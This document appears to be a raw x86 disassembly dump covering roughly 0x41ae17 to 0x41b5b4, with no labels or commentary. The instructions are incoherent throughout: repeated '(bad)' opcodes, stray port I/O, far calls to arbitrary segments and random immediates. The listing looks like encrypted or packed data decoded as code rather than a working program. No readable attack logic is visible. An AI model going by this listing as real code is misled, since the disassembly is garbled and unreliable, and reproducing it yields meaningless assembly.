  41ae17:	or     DWORD PTR [edx],edx
  41ae19:	cmp    bl,BYTE PTR [ecx+ecx*4+0x4b]
  41ae1d:	enter  0xff40,0xeb
  41ae21:	data16 jmp 0x41ae2d
  41ae24:	inc    esp
  41ae25:	push   0xa2b46e76
  41ae2a:	inc    esp
  41ae2b:	pop    esp
  41ae2c:	ffreep st(7)
  41ae2e:	jns    0x41adec
  41ae30:	add    eax,0xf385a6ca
  41ae35:	aaa    
  41ae36:	scas   al,BYTE PTR es:[edi]
  41ae37:	ins    BYTE PTR es:[edi],dx
  41ae38:	push   esi
  41ae39:	(bad)  
  41ae3a:	ds add eax,0x6b4a12e9
  41ae40:	inc    eax
  41ae41:	pop    esi
  41ae42:	xchg   esi,eax
  41ae43:	adc    eax,0x7d00f755
  41ae48:	mov    ebp,0xdf166419
  41ae4d:	cmp    BYTE PTR [eiz*8-0x54d42c64],al
  41ae54:	mov    cl,0x2
  41ae56:	fsub   QWORD PTR [edx+0x3a]
  41ae59:	dec    eax
  41ae5a:	jg     0x41ae09
  41ae5c:	mov    dh,0x41
  41ae5e:	jbe    0x41ae81
  41ae60:	mov    ebx,0x364131a3
  41ae65:	inc    ecx
  41ae66:	mov    eax,ds:0x6b0ce2b2
  41ae6b:	shl    BYTE PTR [edx],0xe9
  41ae6e:	jmp    0x5d17:0xfca59de
  41ae75:	mov    ch,0xc2
  41ae77:	iret   
  41ae78:	add    dh,BYTE PTR [eax]
  41ae7a:	xchg   edx,eax
  41ae7b:	push   ss
  41ae7c:	jne    0x41ae73
  41ae7e:	in     eax,0xc5
  41ae80:	sbb    al,0x80
  41ae82:	fst    QWORD PTR [edi]
  41ae84:	cmp    cl,BYTE PTR [eax-0x16]
  41ae87:	mov    BYTE PTR [esi+0x72eb83ca],bh
  41ae8d:	inc    eax
  41ae8e:	mul    BYTE PTR ds:0x8130cebd
  41ae94:	(bad)  
  41ae95:	call   0xb90e8e35
  41ae9a:	xchg   ebp,eax
  41ae9b:	lahf   
  41ae9c:	idiv   BYTE PTR [ebx+eiz*1]
  41ae9f:	mov    esp,0xf86edd31
  41aea4:	call   0x4558:0x9e154b66
  41aeab:	fsub   QWORD PTR [edi+ebp*8-0x305ffc84]
  41aeb2:	mov    DWORD PTR ds:0xe5f1789a,ebx
  41aeb8:	or     eax,0xb3d4eb3e
  41aebd:	mov    gs,ecx
  41aebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec1:	out    0x0,al
  41aec3:	jg     0x41aede
  41aec5:	popf   
  41aec6:	sub    ebp,edx
  41aec8:	pop    sp
  41aeca:	push   eax
  41aecb:	and    dl,cl
  41aecd:	faddp  st(4),st
  41aecf:	xchg   esi,eax
  41aed0:	imul   ebp,DWORD PTR [ecx-0x69],0x31
  41aed4:	or     BYTE PTR [edi],cl
  41aed6:	loope  0x41af0b
  41aed8:	test   bl,cl
  41aeda:	in     eax,0x2e
  41aedc:	std    
  41aedd:	or     BYTE PTR [edx+0x2e],ah
  41aee0:	jne    0x41aebd
  41aee2:	fwait
  41aee3:	add    ah,BYTE PTR [ebp+edi*4+0x65b54869]
  41aeea:	pop    ecx
  41aeeb:	xor    edi,DWORD PTR [ebx]
  41aeed:	out    0x94,al
  41aeef:	pop    eax
  41aef0:	cmp    bl,0xd7
  41aef3:	sbb    esi,0xae6adf05
  41aef9:	ficom  DWORD PTR [edx+0x630417be]
  41aeff:	jns    0x41ae88
  41af01:	shr    BYTE PTR ds:[eax],0x26
  41af05:	jle    0x41af03
  41af07:	icebp  
  41af08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af09:	adc    dh,al
  41af0b:	mov    ds:0x339adaef,al
  41af10:	scas   eax,DWORD PTR es:[edi]
  41af11:	in     al,dx
  41af12:	add    bh,0xe3
  41af15:	(bad)  
  41af16:	cs dec esi
  41af18:	mov    esi,0x1afbdf8c
  41af1d:	sbb    eax,0x78a9d99c
  41af22:	sbb    eax,0x79d9d26a
  41af27:	mov    al,BYTE PTR [ebx]
  41af29:	xchg   DWORD PTR [ebp+ebp*4+0x6d],esp
  41af2d:	dec    edx
  41af2e:	shl    ebx,0x79
  41af31:	imul   eax,DWORD PTR [edi-0x6d83d393],0x4
  41af38:	lock fwait
  41af3a:	pop    es
  41af3b:	ret    
  41af3c:	add    bh,bl
  41af3e:	mov    ebp,0x85f5d2f5
  41af43:	sub    al,BYTE PTR [edi+0x53]
  41af46:	add    ebp,esi
  41af48:	mov    ebx,DWORD PTR [edi+0x44]
  41af4b:	mov    DWORD PTR [ecx-0xb],edi
  41af4e:	inc    esi
  41af4f:	fld    QWORD PTR [ecx-0x493ecb00]
  41af55:	lds    ebx,FWORD PTR [ebp-0x38]
  41af58:	mov    al,0x8a
  41af5a:	push   ss
  41af5b:	retf   
  41af5c:	imul   ebp,edi,0x979bcee6
  41af62:	mov    al,0x5a
  41af64:	loope  0x41aee9
  41af66:	sbb    BYTE PTR [edx],0xea
  41af69:	fwait
  41af6a:	in     eax,dx
  41af6b:	into   
  41af6c:	fsub   DWORD PTR [esi-0x5bf5674b]
  41af72:	xor    BYTE PTR [esi+0x49],ah
  41af75:	mov    ch,0xa0
  41af77:	sub    ah,BYTE PTR [edx+0x2d315f60]
  41af7d:	push   0x44a36882
  41af82:	xchg   ebx,eax
  41af83:	adc    edx,DWORD PTR [edi]
  41af85:	stos   BYTE PTR es:[edi],al
  41af86:	gs mov dh,bl
  41af89:	inc    edi
  41af8a:	sbb    BYTE PTR [edx-0x17],dh
  41af8d:	push   ebp
  41af8e:	repz jecxz 0x41afa1
  41af91:	in     al,dx
  41af92:	pop    ecx
  41af93:	mov    bl,0x84
  41af95:	and    BYTE PTR [ebx],dh
  41af97:	xor    ah,BYTE PTR [ecx]
  41af99:	add    eax,ebx
  41af9b:	pop    ecx
  41af9c:	icebp  
  41af9d:	(bad)
  41afa0:	ins    BYTE PTR es:[edi],dx
  41afa1:	and    eax,0x27ea22f1
  41afa6:	loope  0x41af88
  41afa8:	add    BYTE PTR [eax-0x2dc8cd41],al
  41afae:	data16 lods al,BYTE PTR ds:[esi]
  41afb0:	fxch   st(5)
  41afb2:	pop    ebx
  41afb3:	mov    eax,0x62af1da8
  41afb8:	xor    eax,0xcfd2e202
  41afbd:	push   ebp
  41afbe:	ds jne 0x41afbf
  41afc1:	cdq    
  41afc2:	or     ah,BYTE PTR [ebp+0x1e8d81fa]
  41afc8:	pop    ds
  41afc9:	inc    edi
  41afca:	loope  0x41af89
  41afcc:	adc    BYTE PTR [ebp+0x64fa9070],al
  41afd2:	dec    esp
  41afd3:	pop    ds
  41afd4:	mov    ds:0xf4892767,al
  41afd9:	call   0xc032bc4c
  41afde:	loope  0x41af6b
  41afe0:	pop    edi
  41afe1:	cmp    dh,BYTE PTR ds:0xa171f09f
  41afe7:	in     eax,dx
  41afe8:	mov    eax,ds:0x999c0ddb
  41afed:	jmp    0x41b000
  41afef:	jo     0x41b056
  41aff1:	int3   
  41aff2:	enter  0x89d7,0x9e
  41aff6:	daa    
  41aff7:	pop    ebx
  41aff8:	mov    bl,0x8a
  41affa:	push   esi
  41affb:	xchg   esp,eax
  41affc:	call   0xbf4c:0x72aa1da3
  41b003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b004:	sub    al,0xb3
  41b006:	dec    ebp
  41b007:	in     al,dx
  41b008:	mov    esi,0xf67f7093
  41b00d:	pop    eax
  41b00e:	je     0x41b06e
  41b010:	jl     0x41b005
  41b012:	(bad)  
  41b013:	mov    ebx,0xcc141012
  41b018:	sbb    ch,dh
  41b01a:	jnp    0x41aff7
  41b01c:	inc    edi
  41b01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b01e:	jae    0x41b05c
  41b020:	mov    ds:0x13898dec,al
  41b025:	pop    ecx
  41b026:	jg     0x41afa8
  41b028:	pop    ebx
  41b029:	mov    ah,BYTE PTR [edi+0x7bba091]
  41b02f:	aaa    
  41b030:	call   0x82af5a01
  41b035:	push   ecx
  41b036:	inc    eax
  41b037:	pop    esi
  41b038:	cwde   
  41b039:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41b03b:	fistp  DWORD PTR ds:[esi+edx*2]
  41b03f:	je     0x41b093
  41b041:	sub    esi,DWORD PTR [ebp+0x5c]
  41b044:	mov    eax,ds:0x5727b9f5
  41b049:	mov    edi,0xad6183d9
  41b04e:	mov    ebx,0x55163f2e
  41b053:	add    BYTE PTR [ebp+0x5d],bh
  41b056:	inc    edi
  41b057:	out    dx,al
  41b058:	xchg   ecx,eax
  41b059:	dec    esp
  41b05a:	cmp    BYTE PTR [ebp+0x621356f9],bh
  41b060:	xor    al,0xfa
  41b062:	jb     0x41b0cf
  41b064:	jno    0x41b0e2
  41b066:	out    0x38,eax
  41b068:	repnz sub ch,ch
  41b06b:	mov    cl,0x13
  41b06d:	inc    eax
  41b06e:	nop
  41b06f:	sub    DWORD PTR [edx-0x5e58a5f8],0x9e9dca45
  41b079:	into   
  41b07a:	push   cs
  41b07b:	loopne 0x41b09a
  41b07d:	mov    al,0x52
  41b07f:	loope  0x41b0e7
  41b081:	int    0xc1
  41b083:	inc    esi
  41b084:	jno    0x41b0cd
  41b086:	test   BYTE PTR [edi-0x4b],dl
  41b089:	loope  0x41b0fa
  41b08b:	dec    esp
  41b08c:	and    edx,edi
  41b08e:	(bad)  
  41b08f:	jmp    FWORD PTR [edi+0x1d]
  41b092:	arpl   WORD PTR [eax],di
  41b094:	in     eax,0xef
  41b096:	dec    edi
  41b097:	into   
  41b098:	jp     0x41b0e4
  41b09a:	icebp  
  41b09b:	imul   esp,DWORD PTR [esi-0x5c],0xd70f3a9c
  41b0a2:	mov    al,ds:0x457f8bc2
  41b0a7:	push   ss
  41b0a8:	clc    
  41b0a9:	add    al,0x84
  41b0ab:	pop    ds
  41b0ac:	push   esi
  41b0ad:	sahf   
  41b0ae:	inc    ebx
  41b0af:	mov    edi,0xd70e71e
  41b0b4:	fidivr DWORD PTR [edi+esi*2]
  41b0b7:	or     al,0x64
  41b0b9:	add    dl,BYTE PTR gs:[eax+0x33]
  41b0bd:	call   0xabd99f75
  41b0c2:	jmp    0x41b0fc
  41b0c4:	rcl    BYTE PTR [ebx],cl
  41b0c6:	xor    cl,0x5a
  41b0c9:	in     eax,dx
  41b0ca:	add    BYTE PTR [ecx+0x68],cl
  41b0cd:	inc    ebx
  41b0ce:	mov    dl,0x65
  41b0d0:	cmc    
  41b0d1:	or     DWORD PTR [eax*4+0x38ec446e],eax
  41b0d8:	fs dec esp
  41b0da:	call   0xebba:0x4ae9c8b1
  41b0e1:	or     al,0xe0
  41b0e3:	mov    ebx,0x22291736
  41b0e8:	lds    esp,FWORD PTR [eax-0x73898307]
  41b0ee:	icebp  
  41b0ef:	lds    eax,FWORD PTR [esi-0x328721ea]
  41b0f5:	and    al,0x96
  41b0f7:	sbb    ebp,DWORD PTR [edi+0x39]
  41b0fa:	mov    bh,0xf6
  41b0fc:	pop    ss
  41b0fd:	dec    eax
  41b0fe:	cmp    ah,dh
  41b100:	outs   dx,DWORD PTR ds:[esi]
  41b101:	sub    esi,esi
  41b103:	out    0xfe,al
  41b105:	(bad)  
  41b106:	cmp    al,0x6e
  41b108:	js     0x41b0d4
  41b10a:	mov    BYTE PTR [ecx+ecx*2],dh
  41b10d:	int    0x1
  41b10f:	bound  esp,QWORD PTR [eax]
  41b111:	jp     0x41b0e5
  41b113:	and    BYTE PTR [esi-0x8],0x89
  41b117:	jne    0x41b18f
  41b119:	out    dx,al
  41b11a:	test   al,0x2a
  41b11c:	mov    ds:0xb87c5c88,al
  41b121:	jno    0x41b0fb
  41b123:	call   0xc405:0x2f5284d4
  41b12a:	fnsave [esi]
  41b12c:	loope  0x41b18e
  41b12e:	inc    eax
  41b12f:	cmc    
  41b130:	inc    esi
  41b131:	ret    0x801f
  41b134:	dec    ecx
  41b135:	and    ecx,DWORD PTR [eax+0x8]
  41b138:	xchg   edi,eax
  41b139:	ja     0x41b149
  41b13b:	fst    st(7)
  41b13d:	push   es
  41b13e:	or     eax,0xd5b9960f
  41b143:	inc    esi
  41b144:	pop    ebp
  41b145:	out    dx,eax
  41b146:	jecxz  0x41b172
  41b148:	and    bh,BYTE PTR [esi+0x4af26fce]
  41b14e:	pop    esp
  41b14f:	js     0x41b1c5
  41b151:	test   al,0xdf
  41b153:	cmp    BYTE PTR [ebx-0x634280d9],0xe1
  41b15a:	inc    esp
  41b15b:	idiv   BYTE PTR [ebp-0x1968a3f8]
  41b161:	fsub   DWORD PTR [ebx]
  41b163:	outs   dx,DWORD PTR ds:[esi]
  41b164:	push   esp
  41b165:	iret   
  41b166:	adc    esp,DWORD PTR gs:[edx+0x4eb53419]
  41b16d:	cmp    al,0x37
  41b16f:	pop    esi
  41b170:	add    ch,dl
  41b172:	mov    WORD PTR [di],es
  41b175:	addr16 in al,0x47
  41b178:	mov    ch,BYTE PTR [esi-0x489ca5ef]
  41b17e:	lock sub BYTE PTR [ecx+0x74647f0],al
  41b185:	dec    eax
  41b186:	sbb    dl,BYTE PTR [eax]
  41b188:	xor    ebx,DWORD PTR [esi+0x3d5dbd92]
  41b18e:	fnsave [eax-0x22]
  41b191:	sbb    dh,ah
  41b193:	or     ebp,edx
  41b195:	mov    esp,DWORD PTR [eax+eiz*8]
  41b198:	xchg   ecx,eax
  41b199:	icebp  
  41b19a:	xchg   ebp,eax
  41b19b:	(bad)  
  41b19d:	pop    ds
  41b19e:	dec    eax
  41b19f:	adc    eax,0xd17530c5
  41b1a4:	push   0x7e
  41b1a6:	adc    al,0x2d
  41b1a8:	sub    DWORD PTR [esi+0x5fc1d79a],edi
  41b1ae:	pop    es
  41b1af:	adc    bl,dl
  41b1b1:	sub    eax,0xe88ddcda
  41b1b6:	dec    ecx
  41b1b7:	push   edx
  41b1b8:	sahf   
  41b1b9:	gs mov dh,0x7d
  41b1bc:	mov    ebx,0x14af8c3
  41b1c1:	test   al,0x64
  41b1c3:	das    
  41b1c4:	adc    BYTE PTR [esi],0x24
  41b1c7:	dec    edx
  41b1c8:	div    eax
  41b1ca:	idiv   DWORD PTR [edi-0x17]
  41b1cd:	xchg   ebp,eax
  41b1ce:	out    dx,eax
  41b1cf:	call   0x5842:0x9b46cd9e
  41b1d6:	es xor edi,ebx
  41b1d9:	mov    al,0xfd
  41b1db:	adc    BYTE PTR [ecx-0x65f632b5],0x6b
  41b1e2:	lahf   
  41b1e3:	inc    eax
  41b1e4:	sub    al,0x6e
  41b1e6:	pop    eax
  41b1e7:	xlat   BYTE PTR ds:[ebx]
  41b1e8:	imul   edx,DWORD PTR [ebx-0xa],0xffffffc8
  41b1ec:	ficom  DWORD PTR [esp+edi*8+0x1b5fcd18]
  41b1f3:	(bad)  
  41b1f4:	call   FWORD PTR [ebx-0x10]
  41b1f7:	lds    ebp,FWORD PTR [ebp+0x26681116]
  41b1fd:	pop    edx
  41b1fe:	jo     0x41b25f
  41b200:	jo     0x41b1f0
  41b202:	pushf  
  41b203:	neg    DWORD PTR [esi]
  41b205:	lds    esi,FWORD PTR [edx]
  41b207:	mov    ds:0xa8178496,eax
  41b20c:	into   
  41b20d:	cmp    BYTE PTR [esp+edx*4-0x6f],al
  41b211:	xor    BYTE PTR [esi+edx*1+0x40],ah
  41b215:	lds    ebp,FWORD PTR [eax]
  41b217:	dec    ecx
  41b218:	and    edi,ebx
  41b21a:	mov    ax,0xfe7a
  41b21e:	cwde   
  41b21f:	mov    eax,0x976f818c
  41b224:	(bad)
  41b227:	adc    bh,BYTE PTR [eax+eiz*8]
  41b22a:	stc    
  41b22b:	mov    bl,0x5d
  41b22d:	jns    0x41b1cd
  41b22f:	lock test al,bl
  41b232:	sub    al,ch
  41b234:	int    0xe1
  41b236:	sub    ah,BYTE PTR [ecx]
  41b238:	jb     0x41b1f5
  41b23a:	adc    edx,edx
  41b23c:	fstp   DWORD PTR [ebx-0x1f06a0f1]
  41b242:	gs push ecx
  41b244:	jo     0x41b1cc
  41b246:	adc    al,0x4e
  41b248:	(bad)  
  41b24a:	mov    DWORD PTR [edi+0x212645d9],edi
  41b250:	mov    al,0x73
  41b252:	enter  0x7fb3,0x13
  41b256:	imul   edi,DWORD PTR [ebx],0xffffffb8
  41b259:	mov    ?,WORD PTR [esi]
  41b25b:	sbb    al,0x47
  41b25d:	adc    BYTE PTR [ebx+0x51],0xc0
  41b261:	inc    ebp
  41b262:	out    dx,eax
  41b263:	lahf   
  41b264:	popf   
  41b265:	aad    0x9a
  41b267:	jle    0x41b246
  41b269:	sbb    BYTE PTR [edx+0x35df3f4],0x55
  41b270:	sbb    al,0x8a
  41b272:	and    dh,BYTE PTR [eax-0x503820ad]
  41b278:	gs test eax,0xe641424e
  41b27e:	mov    al,0x47
  41b280:	push   edi
  41b281:	aam    0xa4
  41b283:	adc    eax,DWORD PTR [edx+0x6cfd87aa]
  41b289:	sahf   
  41b28a:	adc    al,0x31
  41b28c:	ret    
  41b28d:	mov    cl,0xc1
  41b28f:	push   es
  41b290:	adc    BYTE PTR [ebx],dl
  41b292:	test   DWORD PTR cs:[eax+0x67e0e493],edx
  41b299:	mov    dl,0x8f
  41b29b:	in     al,0xc5
  41b29d:	je     0x41b302
  41b29f:	adc    eax,0x2e6524fa
  41b2a4:	push   ss
  41b2a5:	adc    ebp,ebx
  41b2a7:	cld    
  41b2a8:	xchg   ebx,eax
  41b2a9:	pop    ds
  41b2aa:	sub    dl,cl
  41b2ac:	dec    edx
  41b2ad:	jp     0x41b29e
  41b2af:	dec    ecx
  41b2b0:	(bad)  
  41b2b1:	xlat   BYTE PTR ds:[ebx]
  41b2b2:	in     al,dx
  41b2b3:	int3   
  41b2b4:	rcr    ah,0x4d
  41b2b7:	sub    al,0xb4
  41b2b9:	gs cmp dl,cl
  41b2bc:	fsubr  DWORD PTR [ecx-0x4b1b10b2]
  41b2c2:	adc    dh,BYTE PTR [ebp-0x3e4bd88c]
  41b2c8:	pop    edi
  41b2c9:	inc    ebx
  41b2ca:	out    dx,eax
  41b2cb:	out    dx,al
  41b2cc:	add    BYTE PTR [edx],cl
  41b2ce:	ins    BYTE PTR es:[edi],dx
  41b2cf:	inc    edi
  41b2d0:	daa    
  41b2d1:	cdq    
  41b2d2:	stos   BYTE PTR es:[edi],al
  41b2d3:	push   eax
  41b2d4:	cld    
  41b2d5:	sub    eax,0x6b9a824b
  41b2da:	mov    edx,0x73f82dda
  41b2df:	push   edi
  41b2e0:	xchg   edx,eax
  41b2e1:	add    al,0xc9
  41b2e3:	sub    eax,0x2e36766b
  41b2e8:	sbb    eax,0xfe201592
  41b2ed:	inc    ebp
  41b2ee:	push   ds
  41b2ef:	fwait
  41b2f0:	jp     0x41b2d4
  41b2f2:	pop    edx
  41b2f3:	mov    edi,edi
  41b2f5:	scas   al,BYTE PTR es:[edi]
  41b2f6:	enter  0xecc,0x72
  41b2fa:	ss out 0x99,eax
  41b2fd:	xchg   edi,eax
  41b2fe:	mov    al,ds:0xfd278ffe
  41b303:	dec    edx
  41b304:	mov    al,0xe5
  41b306:	adc    DWORD PTR [edi-0x1f],0xffffffbf
  41b30a:	in     al,0xde
  41b30c:	int3   
  41b30d:	adc    DWORD PTR [ebx+0x35dca823],ebp
  41b313:	mov    dl,0xa0
  41b315:	mov    al,ds:0x39226c37
  41b31a:	out    dx,al
  41b31b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b31c:	xchg   BYTE PTR [edi+0x15],cl
  41b31f:	rcl    edi,cl
  41b321:	out    0xfb,al
  41b323:	mov    dl,0x8a
  41b325:	push   0x7894515
  41b32a:	pushf  
  41b32b:	stos   BYTE PTR es:[edi],al
  41b32c:	or     DWORD PTR ds:0x30d1b5ab,esi
  41b332:	in     al,0x2b
  41b334:	repz adc bh,BYTE PTR [ebp-0x5e57d29d]
  41b33b:	push   edx
  41b33c:	jle    0x41b365
  41b33e:	cmc    
  41b33f:	add    eax,0x5ef89bcf
  41b344:	inc    BYTE PTR [ebx]
  41b346:	(bad)  
  41b347:	push   ds
  41b348:	mov    ds:0x9e83d96e,eax
  41b34d:	pop    ebp
  41b34e:	sub    al,0xd
  41b350:	and    eax,0xba247fd4
  41b355:	dec    ebp
  41b356:	ret    
  41b357:	fdiv   DWORD PTR ds:0x7df64015
  41b35d:	div    DWORD PTR [edx+ebx*8+0x518ae7e2]
  41b364:	push   esp
  41b365:	pop    edx
  41b366:	fidiv  DWORD PTR [ebx-0x1dfe68b7]
  41b36c:	fild   WORD PTR [ecx+ebx*4-0x28b00b15]
  41b373:	xchg   ebp,eax
  41b374:	adc    BYTE PTR [ecx+ebp*1],dl
  41b377:	je     0x41b3eb
  41b379:	dec    esi
  41b37a:	ds in  al,0xbf
  41b37d:	shr    dl,1
  41b37f:	jg     0x41b307
  41b381:	mov    eax,DWORD PTR [ebx-0x509793e]
  41b387:	adc    bh,BYTE PTR [esi+eax*4-0x2d9e8dda]
  41b38e:	inc    edx
  41b38f:	xchg   BYTE PTR [ebx+0x1e90878e],ah
  41b395:	jmp    0x752f:0x2c318601
  41b39c:	mov    bl,BYTE PTR [edx+0x5a]
  41b39f:	clc    
  41b3a0:	push   edi
  41b3a1:	popa   
  41b3a2:	adc    bh,bh
  41b3a4:	fst    DWORD PTR [eax-0x1fe14078]
  41b3aa:	(bad)  
  41b3ab:	test   al,0xf5
  41b3ad:	aad    0x49
  41b3af:	or     eax,0x109865a2
  41b3b4:	push   esi
  41b3b5:	test   DWORD PTR [edx-0x51fec073],ecx
  41b3bb:	lods   al,BYTE PTR ds:[esi]
  41b3bc:	push   esp
  41b3bd:	jne    0x41b396
  41b3bf:	(bad)  
  41b3c0:	out    dx,al
  41b3c1:	shr    DWORD PTR [esi],0xc5
  41b3c4:	and    ebp,edi
  41b3c6:	mov    BYTE PTR [ebp-0x59a38243],0x3b
  41b3cd:	popa   
  41b3ce:	push   edi
  41b3cf:	jbe    0x41b35a
  41b3d1:	cld    
  41b3d2:	neg    BYTE PTR [ebx+0x14]
  41b3d5:	sahf   
  41b3d6:	out    0x63,eax
  41b3d8:	call   0xb804:0x57e65a1
  41b3df:	scas   eax,DWORD PTR es:[edi]
  41b3e0:	rol    BYTE PTR [ecx-0x44],1
  41b3e3:	xor    DWORD PTR [edx],edi
  41b3e5:	bsr    esi,ebp
  41b3e8:	mov    ebx,0xdfd50c8a
  41b3ed:	iret   
  41b3ee:	out    0xd8,eax
  41b3f0:	pop    ebx
  41b3f1:	arpl   WORD PTR [edx+0x6d3638ea],di
  41b3f7:	jns    0x41b41c
  41b3f9:	fldcw  WORD PTR [edx-0x72]
  41b3fc:	dec    ebp
  41b3fd:	mov    esp,0x96ce2dc2
  41b402:	scas   ax,WORD PTR es:[edi]
  41b404:	cmp    al,0x67
  41b406:	inc    ebp
  41b407:	pop    ebp
  41b408:	pop    ds
  41b409:	adc    DWORD PTR [esi+0x48],edi
  41b40c:	jl     0x41b400
  41b40e:	cmp    eax,0xf5a16a3e
  41b413:	les    edi,FWORD PTR [edi+esi*1-0x49bb5fbe]
  41b41a:	jns    0x41b39f
  41b41c:	in     eax,0x70
  41b41e:	clc    
  41b41f:	jmp    0x80f6a594
  41b424:	lock push ebp
  41b426:	xchg   edx,eax
  41b427:	pop    eax
  41b428:	pop    edx
  41b429:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41b42b:	mov    esp,0x349f8c3e
  41b430:	cwde   
  41b431:	cmc    
  41b432:	adc    BYTE PTR [eax],cl
  41b434:	add    eax,0x7dea1390
  41b439:	inc    ebx
  41b43a:	push   esp
  41b43b:	adc    BYTE PTR [esi],dl
  41b43d:	ins    DWORD PTR es:[edi],dx
  41b43e:	sub    dh,BYTE PTR [esi-0xe]
  41b441:	loop   0x41b3f9
  41b443:	and    al,0xee
  41b445:	pop    ebx
  41b446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b447:	mov    eax,0xb4071826
  41b44c:	sar    DWORD PTR [edx-0x6e],1
  41b44f:	lea    esp,[ebx+0x6e]
  41b452:	and    DWORD PTR [edi-0x7e163c74],esp
  41b458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b459:	sub    esi,DWORD PTR [ebx+0x51]
  41b45c:	jmp    0x54ae25d6
  41b461:	jnp    0x41b471
  41b463:	and    eax,0x405aacb5
  41b468:	pop    esp
  41b469:	popa   
  41b46a:	iret   
  41b46b:	loopne 0x41b4b4
  41b46d:	in     eax,0x5
  41b46f:	ja     0x41b4a5
  41b471:	les    ebp,FWORD PTR [esi+0x4f838e41]
  41b477:	adc    DWORD PTR [ebx+ebx*2+0x430758f1],edi
  41b47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b47f:	mov    esi,0x7d71dd9
  41b484:	(bad)  
  41b486:	js     0x41b41f
  41b488:	fyl2x  
  41b48a:	data16 in al,0x9e
  41b48d:	test   BYTE PTR [ebx-0x2809116e],dl
  41b493:	rcl    BYTE PTR [esi+0x12],0xe7
  41b497:	xor    al,0x2f
  41b499:	mov    eax,ds:0x70ed9d7f
  41b49e:	outs   dx,DWORD PTR ds:[esi]
  41b49f:	and    DWORD PTR [esi-0x5f718dc],0x42
  41b4a6:	cwde   
  41b4a7:	xchg   edi,eax
  41b4a8:	and    esi,edx
  41b4aa:	fwait
  41b4ab:	dec    edx
  41b4ac:	retf   
  41b4ad:	xchg   ebx,eax
  41b4ae:	out    0x44,al
  41b4b0:	pop    edx
  41b4b1:	jb     0x41b4e8
  41b4b3:	dec    edi
  41b4b4:	clc    
  41b4b5:	and    BYTE PTR [edx+0x4bc2f064],bl
  41b4bb:	outs   dx,BYTE PTR ds:[esi]
  41b4bc:	dec    eax
  41b4bd:	in     eax,dx
  41b4be:	(bad)  
  41b4bf:	pusha  
  41b4c0:	push   cs
  41b4c1:	test   BYTE PTR [ecx],dl
  41b4c3:	mov    ecx,0xa4150358
  41b4c8:	push   ebx
  41b4c9:	inc    ebp
  41b4ca:	mov    cl,bl
  41b4cc:	test   eax,0x88fc9737
  41b4d1:	add    al,0xd2
  41b4d3:	aaa    
  41b4d4:	ret    0xbbf2
  41b4d7:	pop    ss
  41b4d8:	xchg   edx,eax
  41b4d9:	enter  0x7c72,0x79
  41b4dd:	dec    esp
  41b4de:	js     0x41b4af
  41b4e0:	inc    ebp
  41b4e1:	nop
  41b4e2:	cli    
  41b4e3:	jmp    0x17173bd6
  41b4e8:	add    eax,0x15573a8e
  41b4ed:	sub    esp,ecx
  41b4ef:	hlt    
  41b4f0:	scas   eax,DWORD PTR es:[edi]
  41b4f1:	adc    eax,0x6d66c7dd
  41b4f6:	pop    esi
  41b4f7:	adc    cl,BYTE PTR [eax]
  41b4f9:	fisub  DWORD PTR [ebp-0x3caf9713]
  41b4ff:	and    ah,BYTE PTR [edi+ebp*4]
  41b502:	adc    dl,ch
  41b504:	js     0x41b4b5
  41b506:	adc    ah,BYTE PTR [ebp-0x5ffefcb5]
  41b50c:	out    0xb4,al
  41b50e:	pop    edx
  41b50f:	push   es
  41b510:	enter  0xb0e4,0x2e
  41b514:	shl    DWORD PTR [edi-0x47b6ce84],0x97
  41b51b:	(bad)  
  41b51d:	loop   0x41b568
  41b51f:	daa    
  41b520:	push   esp
  41b521:	xor    eax,ebx
  41b523:	mov    edi,0x9c87a239
  41b528:	jl     0x41b4e3
  41b52a:	inc    eax
  41b52b:	jmp    0x925c5ad
  41b530:	mov    cl,0x39
  41b532:	addr16 mov bl,0xb9
  41b535:	add    al,0x5c
  41b537:	xchg   ebp,eax
  41b538:	in     al,0x45
  41b53a:	add    dl,BYTE PTR [eax+0x16]
  41b53d:	add    al,0x24
  41b53f:	sub    esp,DWORD PTR [edx-0x3e]
  41b542:	icebp  
  41b543:	dec    ebp
  41b544:	out    dx,al
  41b545:	xchg   BYTE PTR [esi-0x2f12789f],cl
  41b54b:	lea    ebp,[ebx+0x56c312b1]
  41b551:	xor    DWORD PTR ds:0x73ee0eba,eax
  41b557:	in     eax,dx
  41b558:	jl     0x41b562
  41b55a:	mov    ah,BYTE PTR [ebp+eiz*2+0x57]
  41b55e:	push   edx
  41b55f:	fld    TBYTE PTR [ebx-0x65d0e9dd]
  41b565:	push   esp
  41b566:	push   ecx
  41b567:	dec    eax
  41b568:	cmp    DWORD PTR [edi],eax
  41b56a:	int    0xac
  41b56c:	inc    eax
  41b56d:	inc    esi
  41b56e:	sti    
  41b56f:	sbb    edx,DWORD PTR [edx-0x24]
  41b572:	xchg   esp,eax
  41b573:	push   ebx
  41b574:	adc    bh,al
  41b576:	cmp    DWORD PTR [ecx-0x60],edi
  41b579:	lods   al,BYTE PTR ds:[esi]
  41b57a:	cwde   
  41b57b:	cmp    esp,esi
  41b57d:	out    dx,al
  41b57e:	test   eax,0x9a3d71f6
  41b583:	mov    ebx,0xdf7f8472
  41b588:	inc    edi
  41b589:	sbb    BYTE PTR [edi-0x67],cl
  41b58c:	sub    ch,bh
  41b58e:	add    edx,edi
  41b590:	add    ecx,ebp
  41b592:	fsub   QWORD PTR [ecx+0x5165e63c]
  41b598:	outs   dx,BYTE PTR ds:[esi]
  41b599:	inc    eax
  41b59a:	pop    esi
  41b59b:	mov    dh,bh
  41b59d:	push   esi
  41b59e:	cmp    al,0x77
  41b5a0:	popf   
  41b5a1:	retf   
  41b5a2:	xor    ah,bl
  41b5a4:	cs call 0xecef8fe2
  41b5aa:	mov    DWORD PTR [edx+ecx*8],ebp
  41b5ad:	cmp    al,0xe5
  41b5af:	iret   
  41b5b0:	xchg   dh,dh
  41b5b2:	or     cl,BYTE PTR [edi]
  41b5b4:	pop    edi
